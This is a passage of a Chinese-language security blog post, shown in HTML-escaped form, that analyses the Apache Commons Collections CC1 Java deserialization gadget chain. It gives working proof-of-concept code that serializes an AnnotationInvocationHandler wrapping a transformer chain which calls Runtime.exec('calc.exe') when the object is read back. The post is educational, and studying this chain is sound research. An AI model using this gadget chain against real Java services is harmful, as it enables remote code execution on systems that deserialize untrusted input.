&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">()),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们创建了一个ChainedTransformer，包含ConstantTransformer（得到Runtime对象）和InvokerTransformer（执行代码部分），这个ChainedTransformer只是作为回调部分，我们用TransformedMap.decorate对它进行包装，最后通过&lt;code>outerMap.put&lt;/code> 向Map中放入新元素触发回调，进而执行命令&lt;/p>
&lt;h3 id="transformedmap">TransformedMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.annotation.Retention&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>仅有demo的代码不足以构造完全可用的poc，实际的反序列化中，不同于手工执行outerMap.put()，我们离不开一个合适的&lt;code>readObject&lt;/code>触发&lt;code>outerMap.put&lt;/code>-&amp;gt;&lt;code>transform&lt;/code>&lt;/p>
&lt;p>这里用到的是&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>，看一下它的&lt;code>readObject&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">defaultReadObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AnnotationType&lt;/span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">AnnotationType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalArgumentException&lt;/span> &lt;span style="color:#111">var9&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Non-annotation type in annotation serial stream&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">memberTypes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Iterator&lt;/span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">memberValues&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">entrySet&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">iterator&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasNext&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Entry&lt;/span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">var6&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
